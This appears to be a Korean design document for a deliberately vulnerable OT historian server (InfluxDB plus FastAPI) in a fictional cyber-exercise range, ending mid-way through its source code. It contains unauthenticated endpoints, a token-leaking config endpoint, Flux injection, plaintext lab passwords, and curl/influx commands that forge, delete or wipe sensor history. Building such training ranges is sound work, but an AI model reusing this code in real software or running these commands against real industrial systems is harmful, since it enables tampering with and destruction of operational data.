# 자산 설계서 #12 — Historian 서버 (OT History Data Server)

| 항목 | 내용 |
|------|------|
| 자산 번호 | 12 |
| 자산명 | Historian 서버 (OT History Data Server) |
| IP 주소 | 192.168.92.212 |
| 도메인 | historian.mois.local |
| OS | Ubuntu 22.04 LTS |
| 네트워크 구간 | Industrial DMZ (192.168.92.0/24) |
| 개방 포트 | 8086/tcp (InfluxDB), 8000/tcp (REST API) |
| 작성일 | 2026-03-26 |
| 버전 | 1.0 |

---

## 1. 개요

### 1.1 자산 목적

Historian 서버는 가상국가 발도리아(Valdoria) 행정안전부(MOIS)의 Industrial DMZ에 위치한 OT(Operational Technology) 이력 데이터 저장 및 조회 서버이다. OT 구간의 SCADA 시스템에서 수집된 센서 태그 데이터(온도, 압력, 유량, 전력 등)를 시계열 데이터베이스(InfluxDB)에 저장하고, INT 구간의 업무 시스템이 이 데이터를 조회할 수 있도록 경량 REST API(FastAPI)를 제공한다.

이 서버는 INT 구간과 OT 구간 사이의 **데이터 브릿지(Data Bridge)** 역할을 수행하며, 다음과 같은 데이터 흐름을 지원한다:

- **OT → Historian**: SCADA 시스템(192.168.92.213)이 센서 데이터를 InfluxDB에 직접 기록
- **INT → Historian**: 내부 업무 시스템(192.168.92.204 등)이 REST API를 통해 이력 데이터 조회

### 1.2 훈련에서의 역할

> **이 자산은 INT→OT 공격 경로의 핵심 중간 거점(Pivot Point)이며, OT 데이터 무결성 공격의 대상이다.**

공격자가 INT 구간에서 횡이동을 완료한 후, Historian 서버의 인증 없는 REST API를 통해 다음 공격을 수행한다:

- **OT 이력 데이터 삭제**: 사고 은폐를 위한 증거 인멸
- **허위 데이터 삽입**: 정상 운영처럼 보이도록 센서 데이터 위조
- **InfluxDB 토큰 탈취**: `/api/config` 엔드포인트에서 하드코딩된 토큰 노출
- **OT 네트워크 피벗**: 탈취한 토큰과 네트워크 정보를 이용해 OT 구간으로 침투 시도

### 1.3 공격 체인 내 위치 (STEP 3-1)

```
[STEP 2] INT 구간 침투 완료 — 민원 처리 서버(192.168.92.206) RCE 확보
    │
    │  환경변수에서 Historian API 정보 탈취:
    │  HISTORIAN_API=http://192.168.92.212:8000
    │
    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ [★ STEP 3-1: Historian 서버 (Industrial DMZ, 192.168.92.212)]              │
│                                                                             │
│   ① API 엔드포인트 탐색 (인증 없음)                                         │
│      curl http://192.168.92.212:8000/api/tags                              │
│      curl http://192.168.92.212:8000/api/config   ← InfluxDB 토큰 노출     │
│                                                                             │
│   ② OT 이력 데이터 공격                                                     │
│      ├── GET  /api/query → 센서 데이터 전체 조회 (정찰)                      │
│      ├── POST /api/write → 허위 센서 데이터 삽입 (위조)                      │
│      └── DELETE /api/data → 이상 징후 이력 삭제 (은폐)                       │
│                                                                             │
│   ③ InfluxDB 토큰으로 직접 접근                                             │
│      influx query --host http://192.168.92.212:8086                        │
│               --token historian-dev-token-2024                              │
│                                                                             │
│   ④ OT 네트워크 정보 수집 → SCADA(192.168.92.213) 피벗 준비                 │
│                                                                             │
│   ★ 데이터 무결성 침해 + OT 피벗 거점 확보 ★                                 │
└─────────────────────────────────────────────────────────────────────────────┘
    │
    ▼
[STEP 3-2] OT 구간 침투 — SCADA 시스템 공격
```

> **요약:** Historian 서버는 INT 구간과 OT 구간 사이의 유일한 합법적 데이터 경로이다. 인증 없는 API와 노출된 InfluxDB 토큰으로 인해, 공격자가 OT 데이터를 직접 조작하고 OT 네트워크로 피벗하는 핵심 거점이 된다.

---

## 2. 기술 스택

| 계층 | 기술 | 버전 | 용도 | 비고 |
|------|------|------|------|------|
| OS | Ubuntu | 22.04 LTS (Jammy Jellyfish) | 기반 운영체제 | |
| 시계열 DB | InfluxDB | 2.7.x | OT 센서 태그 데이터 저장 | Flux 쿼리 언어 사용 |
| REST API | FastAPI | 0.104.x | INT→OT 데이터 조회 API | **인증 미구현 (의도적)** |
| 런타임 | Python | 3.11 | API 서버 런타임 | uvicorn ASGI 서버 |
| DB 클라이언트 | influxdb-client | 1.38.x | Python ↔ InfluxDB 연동 | |
| 프로세스 관리 | systemd | (내장) | API 서버/InfluxDB 서비스 관리 | |
| 방화벽 | ufw | (내장) | 호스트 방화벽 | |

### 2.1 Python 패키지 (requirements.txt)

```
fastapi==0.104.1
uvicorn[standard]==0.24.0
influxdb-client==1.38.0
python-dotenv==1.0.0
pydantic==2.5.0
```

---

## 3. 컴포넌트 아키텍처

### 3.1 시스템 구성도

```
 ┌──── INT (192.168.92.0/24) ────────────────────────────────────────────┐
 │                                                                         │
 │  ┌────────────────────┐   ┌────────────────────┐                        │
 │  │ 민원 처리 서버       │   │ 내부 업무 포털      │                        │
 │  │ (192.168.92.206)   │   │ (192.168.92.204)   │                        │
 │  │                    │   │                    │                        │
 │  └────────┬───────────┘   └────────┬───────────┘                        │
 │           │                        │                                    │
 └───────────┼────────────────────────┼────────────────────────────────────┘
             │ :8000 (REST API)       │ :8000 (REST API)
             │                        │
    ═════════╪════════════════════════╪══════  OPNSense-4 (INT→Industrial DMZ)
             │   허용: 단방향, 특정 포트  │        역방향 차단
             │                        │
 ┌──── Industrial DMZ (192.168.92.0/24) ─────────────────────────────────┐
 │           │                        │                                    │
 │           ▼                        ▼                                    │
 │  ┌─────────────────────────────────────────────────────────────────┐    │
 │  │              Historian 서버 (192.168.92.212)                     │    │
 │  │              Ubuntu 22.04 LTS                                   │    │
 │  │                                                                 │    │
 │  │  ┌──────────────────────┐     ┌──────────────────────────────┐  │    │
 │  │  │  FastAPI REST API     │     │  InfluxDB 2.7                │  │    │
 │  │  │  :8000                │────▶│  :8086                       │  │    │
 │  │  │                      │     │                              │  │    │
 │  │  │  ★ 인증 없음 ★        │     │  Org: ot-org                 │  │    │
 │  │  │  ★ 토큰 노출 ★        │     │  Bucket: ot_data             │  │    │
 │  │  │                      │     │  Token: historian-dev-...     │  │    │
 │  │  │  /api/tags           │     │                              │  │    │
 │  │  │  /api/query          │     │  Tags:                       │  │    │
 │  │  │  /api/write          │     │  ├─ temperature (온도)         │  │    │
 │  │  │  /api/data (DELETE)  │     │  ├─ pressure (압력)           │  │    │
 │  │  │  /api/health         │     │  ├─ flow_rate (유량)          │  │    │
 │  │  │  /api/config ★위험★   │     │  └─ power (전력)             │  │    │
 │  │  └──────────────────────┘     └──────────────────────────────┘  │    │
 │  │                                         ▲                       │    │
 │  └─────────────────────────────────────────┼───────────────────────┘    │
 │                                            │                            │
 └────────────────────────────────────────────┼────────────────────────────┘
                                              │ :8086 (InfluxDB write)
                                              │
    ══════════════════════════════════════════╪══════  OPNSense-5 (OT→Industrial DMZ)
                                              │   허용: SCADA→Historian 쓰기만
                                              │
 ┌──── OT (192.168.92.0/24) ─────────────────┼───────────────────────────┐
 │                                            │                            │
 │  ┌────────────────────┐                    │                            │
 │  │ SCADA 시스템        │────────────────────┘                            │
 │  │ (192.168.92.213)   │   Telegraf/직접 쓰기 → InfluxDB                 │
 │  │                    │                                                 │
 │  └────────────────────┘                                                 │
 │                                                                         │
 └─────────────────────────────────────────────────────────────────────────┘
```

### 3.2 데이터 흐름 상세

| 방향 | 출발지 | 목적지 | 포트 | 프로토콜 | 용도 |
|------|--------|--------|------|---------|------|
| OT → Industrial DMZ | SCADA (192.168.92.213) | Historian InfluxDB | 8086 | HTTP (InfluxDB Line Protocol) | 센서 데이터 기록 |
| INT → Industrial DMZ | 민원 처리 서버 (192.168.92.206) | Historian REST API | 8000 | HTTP (JSON) | OT 데이터 조회 |
| Industrial DMZ 내부 | FastAPI (:8000) | InfluxDB (:8086) | 8086 | HTTP (Flux Query) | API→DB 쿼리 |
| **차단** | Industrial DMZ | INT | * | * | **역방향 트래픽 차단** |
| **차단** | Industrial DMZ | OT | * | * | **역방향 트래픽 차단** |

---

## 4. 네트워크 설정

### 4.1 인터페이스 구성

| 인터페이스 | IP 주소 | 서브넷 | 게이트웨이 | 용도 |
|-----------|---------|--------|-----------|------|
| ens160 | 192.168.92.212 | /24 | 192.168.92.1 | Industrial DMZ 서비스 |

### 4.2 리스닝 포트

| 포트 | 프로토콜 | 서비스 | 바인드 | 비고 |
|------|---------|--------|-------|------|
| 8086 | TCP | InfluxDB | 0.0.0.0 | **SCADA 데이터 수신 + API 내부 쿼리** |
| 8000 | TCP | FastAPI (uvicorn) | 0.0.0.0 | **★ 인증 없는 REST API ★** |

### 4.3 방화벽 규칙 (ufw)

```bash
# 인바운드
ufw allow from 192.168.92.0/24 to any port 8000 proto tcp    # INT → REST API
ufw allow from 192.168.92.213/32 to any port 8086 proto tcp   # SCADA → InfluxDB 쓰기
ufw allow from 127.0.0.1 to any port 8086 proto tcp           # 로컬 API → InfluxDB

# ★ 취약점: INT 서브넷 전체에서 API 접근 가능 (특정 호스트 제한 없음) ★
# ★ 취약점: InfluxDB 포트가 SCADA 외에도 접근 가능하도록 설정될 여지 ★

# 아웃바운드
ufw default allow outgoing
```

### 4.4 OPNSense-4 규칙 (INT ↔ Industrial DMZ)

| 순번 | 방향 | 출발지 | 목적지 | 포트 | 동작 | 설명 |
|------|------|--------|--------|------|------|------|
| 1 | INT → Industrial DMZ | 192.168.92.206 | 192.168.92.212 | 8000 | ALLOW | 민원 처리 서버 → Historian API |
| 2 | INT → Industrial DMZ | 192.168.92.0/24 | 192.168.92.212 | 8000 | ALLOW | INT 전체 → Historian API |
| 3 | Industrial DMZ → INT | 192.168.92.0/24 | 192.168.92.0/24 | * | **BLOCK** | 역방향 차단 |

> **보안 문제:** 규칙 2에서 INT 전체 서브넷에 대해 Historian API 접근이 허용되어 있다. 정상적이라면 민원 처리 서버(192.168.92.206)만 허용해야 하지만, 의도적으로 넓게 열어두어 횡이동한 공격자가 접근할 수 있도록 설계했다.

### 4.5 OPNSense-5 규칙 (OT ↔ Industrial DMZ)

| 순번 | 방향 | 출발지 | 목적지 | 포트 | 동작 | 설명 |
|------|------|--------|--------|------|------|------|
| 1 | OT → Industrial DMZ | 192.168.92.213 | 192.168.92.212 | 8086 | ALLOW | SCADA → InfluxDB 쓰기 |
| 2 | Industrial DMZ → OT | 192.168.92.212 | 192.168.92.213 | * | **BLOCK** | 역방향 차단 |

---

## 5. 디렉토리 구조

```
/opt/historian/
├── app/
│   ├── main.py                    # FastAPI 메인 애플리케이션 ★ 취약 코드 ★
│   ├── requirements.txt           # Python 패키지 목록
│   └── .env                       # 환경변수 (InfluxDB 토큰 하드코딩)
├── config/
│   ├── influxdb/
│   │   ├── config.yml             # InfluxDB 설정
│   │   └── influx-configs         # InfluxDB CLI 프로필
│   └── systemd/
│       ├── historian-api.service  # FastAPI 서비스 유닛
│       └── influxdb.service       # InfluxDB 서비스 유닛 (심볼릭 링크)
├── data/
│   └── influxdb/                  # InfluxDB 데이터 디렉토리
│       ├── engine/                # TSM 스토리지 엔진
│       └── bolt/                  # 메타데이터 (BoltDB)
├── logs/
│   ├── api-access.log             # FastAPI 접근 로그
│   ├── api-error.log              # FastAPI 에러 로그
│   └── influxdb.log               # InfluxDB 로그 (심볼릭 링크)
├── scripts/
│   ├── setup.sh                   # 초기 설치 스크립트
│   ├── seed_data.py               # 시드 데이터 생성 스크립트
│   └── backup.sh                  # 데이터 백업 스크립트
└── README.md                      # 운영 매뉴얼
```

### 5.1 주요 설정 파일 경로

| 파일 | 경로 | 용도 |
|------|------|------|
| FastAPI 앱 | `/opt/historian/app/main.py` | REST API 소스 코드 |
| 환경변수 | `/opt/historian/app/.env` | InfluxDB 접속 정보 (토큰 포함) |
| InfluxDB 설정 | `/opt/historian/config/influxdb/config.yml` | DB 설정 |
| API 서비스 | `/etc/systemd/system/historian-api.service` | systemd 유닛 |
| API 로그 | `/opt/historian/logs/api-access.log` | 접근 로그 |

---

## 6. API/서비스 명세

### 6.1 엔드포인트 목록

| 메서드 | 경로 | 인증 | 설명 | 취약여부 |
|--------|------|------|------|---------|
| GET | `/api/health` | 없음 | 서버 상태 확인 | - |
| GET | `/api/tags` | **없음** | 전체 태그 목록 조회 | **★ VULN** |
| GET | `/api/query` | **없음** | 태그 데이터 조회 | **★ VULN** |
| POST | `/api/write` | **없음** | 데이터 삽입 | **★ VULN** |
| DELETE | `/api/data` | **없음** | 데이터 삭제 | **★ VULN** |
| GET | `/api/config` | **없음** | 시스템 설정 노출 | **★★ CRITICAL** |

### 6.2 엔드포인트 상세

#### 6.2.1 GET /api/health

서버 상태 확인 (헬스체크)

**요청:**
```http
GET /api/health HTTP/1.1
Host: historian.mois.local:8000
```

**응답 (200 OK):**
```json
{
    "status": "healthy",
    "influxdb": "connected",
    "uptime_seconds": 86421,
    "version": "1.0.0"
}
```

#### 6.2.2 GET /api/tags — 전체 태그 목록 조회 (★ 인증 없음)

**요청:**
```http
GET /api/tags HTTP/1.1
Host: historian.mois.local:8000
```

**응답 (200 OK):**
```json
{
    "tags": [
        {
            "name": "temperature",
            "description": "온도 센서 (°C)",
            "unit": "°C",
            "min": 20.0,
            "max": 30.0
        },
        {
            "name": "pressure",
            "description": "압력 센서 (bar)",
            "unit": "bar",
            "min": 90.0,
            "max": 110.0
        },
        {
            "name": "flow_rate",
            "description": "유량 센서 (L/min)",
            "unit": "L/min",
            "min": 100.0,
            "max": 200.0
        },
        {
            "name": "power",
            "description": "전력 센서 (V)",
            "unit": "V",
            "min": 220.0,
            "max": 240.0
        }
    ]
}
```

#### 6.2.3 GET /api/query — 태그 데이터 조회 (★ 인증 없음)

**요청:**
```http
GET /api/query?tag=temperature&from=-1h&to=now() HTTP/1.1
Host: historian.mois.local:8000
```

**파라미터:**

| 파라미터 | 타입 | 필수 | 설명 | 예시 |
|---------|------|------|------|------|
| tag | string | Y | 태그명 | temperature, pressure |
| from | string | N | 시작 시각 (기본: -1h) | -1h, -24h, 2026-03-25T00:00:00Z |
| to | string | N | 종료 시각 (기본: now()) | now(), 2026-03-26T00:00:00Z |
| limit | int | N | 최대 레코드 수 (기본: 1000) | 100 |

**응답 (200 OK):**
```json
{
    "tag": "temperature",
    "count": 3,
    "data": [
        {
            "time": "2026-03-26T10:00:00Z",
            "value": 24.7,
            "unit": "°C"
        },
        {
            "time": "2026-03-26T10:00:05Z",
            "value": 24.8,
            "unit": "°C"
        },
        {
            "time": "2026-03-26T10:00:10Z",
            "value": 24.6,
            "unit": "°C"
        }
    ]
}
```

#### 6.2.4 POST /api/write — 데이터 삽입 (★ 인증 없음, 입력 검증 없음)

**요청:**
```http
POST /api/write HTTP/1.1
Host: historian.mois.local:8000
Content-Type: application/json

{
    "tag": "temperature",
    "value": 25.5,
    "timestamp": "2026-03-26T10:00:00Z"
}
```

**응답 (201 Created):**
```json
{
    "status": "written",
    "tag": "temperature",
    "value": 25.5,
    "timestamp": "2026-03-26T10:00:00Z"
}
```

**공격 예시 — 허위 데이터 삽입:**
```bash
# 정상 범위(20-30°C)를 초과하는 위험 값 삽입
curl -X POST http://192.168.92.212:8000/api/write \
  -H "Content-Type: application/json" \
  -d '{"tag":"temperature","value":999.9,"timestamp":"2026-03-26T10:00:00Z"}'

# 과거 시점의 데이터 위조 (타임스탬프 조작)
curl -X POST http://192.168.92.212:8000/api/write \
  -H "Content-Type: application/json" \
  -d '{"tag":"pressure","value":100.0,"timestamp":"2026-03-25T00:00:00Z"}'
```

#### 6.2.5 DELETE /api/data — 데이터 삭제 (★ 인증 없음)

**요청:**
```http
DELETE /api/data?tag=temperature&from=2026-03-25T00:00:00Z&to=2026-03-26T00:00:00Z HTTP/1.1
Host: historian.mois.local:8000
```

**파라미터:**

| 파라미터 | 타입 | 필수 | 설명 |
|---------|------|------|------|
| tag | string | Y | 삭제할 태그명 |
| from | string | Y | 삭제 시작 시각 |
| to | string | Y | 삭제 종료 시각 |

**응답 (200 OK):**
```json
{
    "status": "deleted",
    "tag": "temperature",
    "from": "2026-03-25T00:00:00Z",
    "to": "2026-03-26T00:00:00Z"
}
```

**공격 예시 — 사고 은폐를 위한 이력 삭제:**
```bash
# 24시간 분량의 온도 이력 삭제 (이상 징후 은폐)
curl -X DELETE "http://192.168.92.212:8000/api/data?tag=temperature&from=2026-03-25T00:00:00Z&to=2026-03-26T00:00:00Z"

# 전체 태그 데이터 삭제 (완전 인멸)
for tag in temperature pressure flow_rate power; do
  curl -X DELETE "http://192.168.92.212:8000/api/data?tag=$tag&from=2020-01-01T00:00:00Z&to=2030-01-01T00:00:00Z"
done
```

#### 6.2.6 GET /api/config — 시스템 설정 노출 (★★ CRITICAL)

**요청:**
```http
GET /api/config HTTP/1.1
Host: historian.mois.local:8000
```

**응답 (200 OK):**
```json
{
    "influxdb_url": "http://192.168.92.212:8086",
    "influxdb_org": "ot-org",
    "influxdb_bucket": "ot_data",
    "influxdb_token": "historian-dev-token-2024",
    "api_version": "1.0.0",
    "scada_endpoint": "192.168.92.213"
}
```

> **★ CRITICAL 취약점:** 이 엔드포인트는 InfluxDB 토큰, 조직명, 버킷명, 그리고 SCADA 시스템 IP 주소까지 모두 노출한다. 공격자는 이 정보만으로 InfluxDB에 직접 접근하여 API를 우회할 수 있으며, SCADA IP를 확인하여 OT 네트워크 침투를 계획할 수 있다.

---

## 7. 사용자/계정 설정

### 7.1 시스템 계정

| 계정명 | UID | 셸 | 홈 디렉토리 | 용도 |
|--------|-----|-----|-----------|------|
| root | 0 | /bin/bash | /root | 시스템 관리자 |
| historian | 1001 | /bin/bash | /home/historian | 서비스 운영 계정 |
| influxdb | 999 | /usr/sbin/nologin | /var/lib/influxdb | InfluxDB 프로세스 계정 |

### 7.2 시스템 계정 패스워드

| 계정 | 패스워드 | 비고 |
|------|---------|------|
| root | `Hist0rian!Root#2024` | |
| historian | `hist-service-2024` | API 서버 실행 계정 |

### 7.3 InfluxDB 계정

| 계정명 | 유형 | 토큰 | 권한 | 비고 |
|--------|------|------|------|------|
| admin | Operator | `historian-dev-token-2024` | **ALL (전체 권한)** | ★ 하드코딩된 개발 토큰 |

### 7.4 InfluxDB 조직 및 버킷

| 항목 | 값 |
|------|-----|
| 조직 (Organization) | `ot-org` |
| 버킷 (Bucket) | `ot_data` |
| 보존 기간 (Retention) | 30일 (2592000초) |

### 7.5 환경변수 (.env)

```bash
# /opt/historian/app/.env
# ★ 취약점: 하드코딩된 자격증명 ★

HISTORIAN_API=http://192.168.92.212:8000
INFLUXDB_URL=http://192.168.92.212:8086
INFLUXDB_TOKEN=historian-dev-token-2024
INFLUXDB_ORG=ot-org
INFLUXDB_BUCKET=ot_data

# SCADA 연동 정보
SCADA_HOST=192.168.92.213
SCADA_PORT=502
```

---

## 8. 의도적 취약점 설계

### 8.1 취약점 목록 요약

| ID | 취약점 | 심각도 | 공격 시나리오 | MITRE ATT&CK |
|----|--------|--------|-------------|--------------|
| VULN-1 | REST API 인증 미구현 | **CRITICAL** | 인증 없이 모든 OT 데이터 조회/조작 | T1190 (Exploit Public-Facing Application) |
| VULN-2 | /api/config에서 InfluxDB 토큰 노출 | **CRITICAL** | 토큰 탈취 → InfluxDB 직접 접근 | T1552.001 (Credentials In Files) |
| VULN-3 | 인가 없는 DELETE 허용 | **HIGH** | OT 이력 데이터 삭제 (사고 은폐) | T1485 (Data Destruction) |
| VULN-4 | write 엔드포인트 입력 검증 없음 | **HIGH** | 허위 센서 데이터 삽입 (데이터 위조) | T1565.001 (Stored Data Manipulation) |
| VULN-5 | Retention Policy 수정 가능 | **MEDIUM** | 보존 기간 단축 → 자동 데이터 소멸 | T1485 (Data Destruction) |

### 8.2 VULN-1: REST API 인증 미구현

**설명:** FastAPI의 모든 엔드포인트에 인증/인가 미들웨어가 구현되어 있지 않다. API에 접근할 수 있는 모든 클라이언트가 인증 없이 전체 기능을 사용할 수 있다.

**취약 코드 (main.py 발췌):**
```python
# ★ VULN-1: 인증 미들웨어 없음 — 모든 엔드포인트가 무인증 ★
@app.get("/api/tags")
async def get_tags():
    """태그 목록 조회 — 인증 없이 접근 가능"""
    return {"tags": TAG_METADATA}
```

**정상 구현 (참고용):**
```python
# 올바른 구현이라면 아래와 같이 인증이 필요
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
security = HTTPBearer()

@app.get("/api/tags")
async def get_tags(credentials: HTTPAuthorizationCredentials = Depends(security)):
    verify_token(credentials.credentials)  # 토큰 검증
    return {"tags": TAG_METADATA}
```

### 8.3 VULN-2: /api/config에서 InfluxDB 토큰 노출

**설명:** `/api/config` 엔드포인트가 InfluxDB 토큰, 접속 URL, 조직명, 버킷명, 그리고 SCADA 시스템 IP까지 모두 평문으로 반환한다.

**취약 코드:**
```python
# ★ VULN-2: InfluxDB 토큰 및 내부 네트워크 정보 노출 ★
@app.get("/api/config")
async def get_config():
    """시스템 설정 조회 — 민감 정보 포함"""
    return {
        "influxdb_url": INFLUXDB_URL,
        "influxdb_org": INFLUXDB_ORG,
        "influxdb_bucket": INFLUXDB_BUCKET,
        "influxdb_token": INFLUXDB_TOKEN,      # ★ 토큰 평문 노출
        "api_version": "1.0.0",
        "scada_endpoint": SCADA_HOST            # ★ OT 네트워크 정보 노출
    }
```

**공격자 활용:**
```bash
# 1. 토큰 탈취
TOKEN=$(curl -s http://192.168.92.212:8000/api/config | jq -r '.influxdb_token')

# 2. InfluxDB에 직접 접근 (API 우회)
curl -H "Authorization: Token $TOKEN" \
  "http://192.168.92.212:8086/api/v2/query?orgID=ot-org" \
  --data-urlencode 'q=from(bucket:"ot_data") |> range(start: -24h)'
```

### 8.4 VULN-3: 인가 없는 DELETE 허용

**설명:** DELETE 메서드가 인증/인가 없이 허용되어 있어, 공격자가 임의 시간 범위의 OT 이력 데이터를 삭제할 수 있다. 이는 사고 은폐에 직접 활용된다.

**취약 코드:**
```python
# ★ VULN-3: 인증 없이 데이터 삭제 허용 ★
@app.delete("/api/data")
async def delete_data(tag: str, from_time: str = Query(alias="from"), to_time: str = Query(alias="to")):
    """데이터 삭제 — 인증/인가 없음, 감사 로깅 미흡"""
    delete_api = client.delete_api()
    delete_api.delete(
        start=from_time,
        stop=to_time,
        predicate=f'_measurement="{tag}"',    # ★ 입력값 직접 사용
        bucket=INFLUXDB_BUCKET,
        org=INFLUXDB_ORG
    )
    return {"status": "deleted", "tag": tag, "from": from_time, "to": to_time}
```

### 8.5 VULN-4: write 엔드포인트 입력 검증 없음

**설명:** POST /api/write 엔드포인트에서 태그명, 값 범위, 타임스탬프에 대한 검증이 전혀 없다. 공격자가 존재하지 않는 태그에 비정상 값을 삽입하거나, 과거/미래 시점의 데이터를 위조할 수 있다.

**취약 코드:**
```python
# ★ VULN-4: 입력 검증 없음 — 임의 태그명, 범위 외 값, 타임스탬프 조작 가능 ★
@app.post("/api/write", status_code=201)
async def write_data(payload: dict):
    """데이터 삽입 — 검증 없음"""
    tag = payload.get("tag")           # ★ 태그명 검증 없음
    value = payload.get("value")       # ★ 값 범위 검증 없음 (음수, 극단값 허용)
    timestamp = payload.get("timestamp")  # ★ 타임스탬프 검증 없음

    point = Point(tag).field("value", float(value)).time(timestamp)
    write_api = client.write_api(write_options=SYNCHRONOUS)
    write_api.write(bucket=INFLUXDB_BUCKET, org=INFLUXDB_ORG, record=point)

    return {"status": "written", "tag": tag, "value": value, "timestamp": timestamp}
```

**정상 구현 (참고용):**
```python
# 올바른 구현이라면 Pydantic 모델로 입력 검증
from pydantic import BaseModel, validator
from datetime import datetime

VALID_TAGS = {"temperature", "pressure", "flow_rate", "power"}
TAG_RANGES = {
    "temperature": (0, 100),
    "pressure": (0, 300),
    "flow_rate": (0, 500),
    "power": (0, 500),
}

class WriteRequest(BaseModel):
    tag: str
    value: float
    timestamp: datetime

    @validator("tag")
    def validate_tag(cls, v):
        if v not in VALID_TAGS:
            raise ValueError(f"Invalid tag: {v}")
        return v

    @validator("value")
    def validate_value(cls, v, values):
        tag = values.get("tag")
        if tag and tag in TAG_RANGES:
            min_val, max_val = TAG_RANGES[tag]
            if not (min_val <= v <= max_val):
                raise ValueError(f"Value {v} out of range for {tag}")
        return v
```

### 8.6 VULN-5: Retention Policy 수정 가능

**설명:** 탈취한 InfluxDB 토큰이 Operator 권한을 가지고 있어, Retention Policy를 임의로 변경할 수 있다. 보존 기간을 1초로 단축하면 기존 데이터가 자동 삭제된다.

**공격 방법:**
```bash
# 탈취한 토큰으로 InfluxDB CLI 접근
influx bucket update \
  --host http://192.168.92.212:8086 \
  --token historian-dev-token-2024 \
  --id $(influx bucket list --host http://192.168.92.212:8086 \
         --token historian-dev-token-2024 --org ot-org \
         --name ot_data --json | jq -r '.[0].id') \
  --retention 1s

# 1초 후 모든 데이터가 자동 삭제됨
```

### 8.7 전체 취약 소스 코드 (main.py)

```python
#!/usr/bin/env python3
"""
Historian 서버 REST API
OT 센서 이력 데이터 조회/삽입/삭제 서비스

★ 경고: 이 코드는 사이버 훈련용으로 의도적 취약점이 포함되어 있습니다 ★
"""

import os
import logging
from datetime import datetime, timezone
from typing import Optional

from fastapi import FastAPI, Query, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from influxdb_client import InfluxDBClient, Point
from influxdb_client.client.write_api import SYNCHRONOUS
from dotenv import load_dotenv

# ─── 환경변수 로드 ───────────────────────────────────────────────────
load_dotenv()

INFLUXDB_URL = os.getenv("INFLUXDB_URL", "http://192.168.92.212:8086")
INFLUXDB_TOKEN = os.getenv("INFLUXDB_TOKEN", "historian-dev-token-2024")  # ★ VULN-2: 하드코딩 토큰
INFLUXDB_ORG = os.getenv("INFLUXDB_ORG", "ot-org")
INFLUXDB_BUCKET = os.getenv("INFLUXDB_BUCKET", "ot_data")
SCADA_HOST = os.getenv("SCADA_HOST", "192.168.92.213")

# ─── 로깅 설정 ───────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("/opt/historian/logs/api-access.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("historian-api")

# ─── 태그 메타데이터 ─────────────────────────────────────────────────
TAG_METADATA = [
    {"name": "temperature", "description": "온도 센서 (°C)", "unit": "°C", "min": 20.0, "max": 30.0},
    {"name": "pressure", "description": "압력 센서 (bar)", "unit": "bar", "min": 90.0, "max": 110.0},
    {"name": "flow_rate", "description": "유량 센서 (L/min)", "unit": "L/min", "min": 100.0, "max": 200.0},
    {"name": "power", "description": "전력 센서 (V)", "unit": "V", "min": 220.0, "max": 240.0},
]

# ─── InfluxDB 클라이언트 초기화 ───────────────────────────────────────
client = InfluxDBClient(
    url=INFLUXDB_URL,
    token=INFLUXDB_TOKEN,
    org=INFLUXDB_ORG
)

# ─── FastAPI 앱 초기화 ────────────────────────────────────────────────
app = FastAPI(
    title="Historian REST API",
    description="OT 센서 이력 데이터 조회 서비스",
    version="1.0.0"
)

# ★ VULN: CORS 전체 허용 — 브라우저 기반 공격도 가능 ★
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


# ═══════════════════════════════════════════════════════════════════════
#  API 엔드포인트
# ═══════════════════════════════════════════════════════════════════════

@app.get("/api/health")
async def health_check():
    """서버 헬스체크"""
    try:
        health = client.health()
        return {
            "status": "healthy",
            "influxdb": health.status,
            "uptime_seconds": int((datetime.now(timezone.utc) - app.state.start_time).total_seconds()),
            "version": "1.0.0"
        }
    except Exception as e:
        return {"status": "unhealthy", "error": str(e)}


# ★ VULN-1: 인증 미들웨어 없음 — 모든 엔드포인트가 무인증 ★
@app.get("/api/tags")
async def get_tags():
    """
    전체 태그 목록 조회
    ★ 취약점: 인증 없이 OT 센서 구성 정보 노출
    """
    logger.info("GET /api/tags — 태그 목록 조회")
    return {"tags": TAG_METADATA}


@app.get("/api/query")
async def query_data(
    tag: str,
    from_time: str = Query("-1h", alias="from"),
    to_time: str = Query("now()", alias="to"),
    limit: int = Query(1000)
):
    """
    태그 데이터 조회
    ★ 취약점: 인증 없이 전체 OT 이력 데이터 조회 가능
    """
    logger.info(f"GET /api/query — tag={tag}, from={from_time}, to={to_time}, limit={limit}")

    # Flux 쿼리 구성
    # ★ 주의: tag 파라미터가 검증 없이 Flux 쿼리에 삽입됨 ★
    flux_query = f'''
        from(bucket: "{INFLUXDB_BUCKET}")
        |> range(start: {from_time}, stop: {to_time})
        |> filter(fn: (r) => r._measurement == "{tag}")
        |> sort(columns: ["_time"])
        |> limit(n: {limit})
    '''

    try:
        query_api = client.query_api()
        tables = query_api.query(flux_query, org=INFLUXDB_ORG)

        data = []
        unit = next((t["unit"] for t in TAG_METADATA if t["name"] == tag), "")
        for table in tables:
            for record in table.records:
                data.append({
                    "time": record.get_time().isoformat(),
                    "value": record.get_value(),
                    "unit": unit
                })

        return {"tag": tag, "count": len(data), "data": data}

    except Exception as e:
        logger.error(f"쿼리 오류: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ★ VULN-4: 입력 검증 없음 — 임의 태그명, 범위 외 값, 타임스탬프 조작 가능 ★
@app.post("/api/write", status_code=201)
async def write_data(payload: dict):
    """
    데이터 삽입
    ★ 취약점: 인증 없음, 태그명/값 범위/타임스탬프 검증 없음
    """
    tag = payload.get("tag")               # ★ 태그명 검증 없음 (임의 태그 생성 가능)
    value = payload.get("value")           # ★ 값 범위 검증 없음 (음수, 극단값 허용)
    timestamp = payload.get("timestamp")   # ★ 타임스탬프 검증 없음 (과거/미래 위조)

    if not tag or value is None:
        raise HTTPException(status_code=400, detail="tag and value are required")

    logger.info(f"POST /api/write — tag={tag}, value={value}, ts={timestamp}")

    try:
        point = Point(tag).field("value", float(value))
        if timestamp:
            point = point.time(timestamp)

        write_api = client.write_api(write_options=SYNCHRONOUS)
        write_api.write(bucket=INFLUXDB_BUCKET, org=INFLUXDB_ORG, record=point)

        return {"status": "written", "tag": tag, "value": value, "timestamp": timestamp}

    except Exception as e:
